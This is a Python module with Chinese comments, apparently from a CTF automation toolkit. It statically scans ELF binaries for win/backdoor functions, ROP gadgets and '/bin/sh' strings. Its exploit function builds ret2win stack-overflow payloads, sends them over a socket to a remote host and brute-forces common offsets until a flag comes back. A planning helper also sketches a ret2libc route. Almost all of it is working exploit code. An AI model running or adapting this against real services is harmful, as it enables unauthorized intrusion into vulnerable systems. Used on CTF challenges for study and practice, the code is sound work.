# -*- coding: utf-8 -*-
"""Pwn 自动化：ELF 静态定位 + ret2win 远程打通。

定位部分：从 ELF 符号表找 win/flag/backdoor 函数、扫 pop rdi;ret 等常用 gadget、
找 /bin/sh 字符串；这些都不需要跑二进制。
打通部分：按用户给的偏移（或自己按常见偏移试）拼 `A*offset + p64(win)` 发到远端，
把回包里的 flag 抓出来。偏移必须实测（cyclic + 崩溃现场），本模块不猜偏移。
"""
import os
import re
import socket
import struct
import time

from .common import Report, scan_flags

COMMON_OFFSETS = [40, 48, 56, 64, 72, 80, 88, 96, 104, 112, 120, 128]


def _elf_info(path):
    from elftools.elf.elffile import ELFFile
    info = {"is64": True, "pie": False, "nx": True, "win": [], "gadgets": {}, "binsh": []}
    with open(path, "rb") as f:
        elf = ELFFile(f)
        info["is64"] = elf.elfclass == 64
        info["pie"] = elf.header["e_type"] == "ET_DYN"
        for seg in elf.iter_segments():
            if seg["p_type"] == "PT_GNU_STACK":
                info["nx"] = not bool(seg["p_flags"] & 1)

        for secname in (".symtab", ".dynsym"):
            sec = elf.get_section_by_name(secname)
            if not sec:
                continue
            for sym in sec.iter_symbols():
                if not sym.name or not sym["st_value"]:
                    continue
                if re.search(r"(?i)(win|flag|backdoor|getshell|shell)", sym.name):
                    info["win"].append((sym.name, sym["st_value"], sym["st_size"]))
        info["win"].sort(key=lambda x: -x[2])

        text = elf.get_section_by_name(".text")
        if text:
            data = text.data()
            base = text["sh_addr"]
            for pat, name in ((b"\x5f\xc3", "pop rdi; ret"), (b"\x5e\xc3", "pop rsi; ret"),
                              (b"\x5a\xc3", "pop rdx; ret"), (b"\xc3", "ret")):
                hits = []
                start = 0
                while len(hits) < 3:
                    i = data.find(pat, start)
                    if i < 0:
                        break
                    hits.append(base + i)
                    start = i + 1
                if hits:
                    info["gadgets"][name] = hits

        for secname in (".rodata", ".data"):
            sec = elf.get_section_by_name(secname)
            if not sec:
                continue
            data = sec.data()
            idx = data.find(b"/bin/sh")
            if idx >= 0:
                info["binsh"].append(sec["sh_addr"] + idx)
    return info


def _build_payload(info, win, offset, ret_align=False):
    pack = (lambda a: struct.pack("<Q", a)) if info["is64"] else (lambda a: struct.pack("<I", a))
    payload = b"A" * int(offset)
    if ret_align and "ret" in info["gadgets"]:
        payload += pack(info["gadgets"]["ret"][0])
    payload += pack(win)
    return payload


def _recv_all(sock, timeout=6.0):
    sock.settimeout(timeout)
    chunks = []
    end = time.time() + timeout
    while time.time() < end:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def _try_once(host, port, payload, timeout=6.0):
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
    except OSError as e:
        return None, "连接失败：%s" % e
    try:
        _recv_all(s, timeout=2.0)
        s.sendall(payload)
        out = _recv_all(s, timeout=timeout)
    finally:
        try:
            s.close()
        except Exception:
            pass
    return out, ""


def exploit(path, host, port, offset=0, win_addr=0, report=None, log=None):
    """ret2win 一键打通。offset=0 时按常见偏移逐个试（会多连几次）。"""
    log = log or (lambda m: None)
    report = report if report is not None else Report(path)
    try:
        info = _elf_info(path)
    except Exception as e:
        log("[pwn] ELF 解析失败：%s" % e)
        info = {"is64": True, "pie": False, "nx": True, "win": [], "gadgets": {}, "binsh": []}

    if not win_addr:
        if not info["win"]:
            log("[pwn] 没有找到 win/flag/backdoor 类函数，无法 ret2win；改用 ROP/shellcode 思路")
            return {"ok": False, "reason": "no-win"}
        win_addr = info["win"][0][1]
        log("[pwn] 选中关键函数 %s @ 0x%x" % (info["win"][0][0], win_addr))

    offsets = [int(offset)] if offset else COMMON_OFFSETS
    for off in offsets:
        payload = _build_payload(info, win_addr, off)
        log("[pwn] 尝试偏移 %d，payload %d 字节" % (off, len(payload)))
        out, err = _try_once(host, port, payload)
        if err:
            log("[pwn] " + err)
            return {"ok": False, "reason": err}
        text = (out or b"").decode("utf-8", "ignore")
        flags = scan_flags(out or b"", strong_only=True)
        if flags:
            for f in flags:
                report.add("flag", "Pwn ret2win 命中 flag", f)
            log("[pwn] 偏移 %d 打通，拿到 %s" % (off, flags[0]))
            return {"ok": True, "offset": off, "win": win_addr, "flags": flags, "output": text}
        log("[pwn] 偏移 %d 没拿到 flag（回包 %d 字节）" % (off, len(text)))
    return {"ok": False, "reason": "offset-not-found"}


def analyze(path, report=None, log=None):
    """只做静态定位，不连远端。"""
    log = log or (lambda m: None)
    report = report if report is not None else Report(path)
    try:
        info = _elf_info(path)
    except Exception as e:
        report.add("warn", "Pwn 静态分析失败", str(e)[:200])
        return {}
    report.add("ok", "Pwn 静态定位",
               "位宽: %s\nPIE: %s\nNX: %s\n"
               % ("64" if info["is64"] else "32", info["pie"], info["nx"]))
    if info["win"]:
        report.add("ok", "候选 win 函数",
                   "\n".join("%s = 0x%x (size 0x%x)" % w for w in info["win"][:8]))
    if info["gadgets"]:
        report.add("ok", "可用 gadget",
                   "\n".join("%s: %s" % (k, ", ".join("0x%x" % a for a in v))
                             for k, v in info["gadgets"].items()))
    if info["binsh"]:
        report.add("info", "/bin/sh 地址", ", ".join("0x%x" % a for a in info["binsh"]))
    return info


def render_plan(info, path):
    lines = ["== Pwn 方案 ==", "文件：%s" % path,
             "位宽：%s｜PIE：%s｜NX：%s" % ("64" if info.get("is64") else "32",
                                        info.get("pie"), info.get("nx"))]
    if info.get("win"):
        w = info["win"][0]
        lines.append("优先目标：%s @ 0x%x" % (w[0], w[1]))
        lines.append("payload = b'A' * <offset> + p64(0x%x)" % w[1])
    else:
        lines.append("没有直白的 win 函数：先看 main/check 的反汇编，或走 ret2libc（pop rdi;ret + /bin/sh + system）")
    if info.get("gadgets"):
        lines.append("gadget：" + "；".join("%s %s" % (k, ", ".join("0x%x" % a for a in v))
                                           for k, v in info["gadgets"].items()))
    lines.append("偏移获取：cyclic 生成 200 字节发过去，崩溃后看 RIP/RSP 覆盖位置；"
                 "本工具可用 --offset 直接指定。")
    return "\n".join(lines)
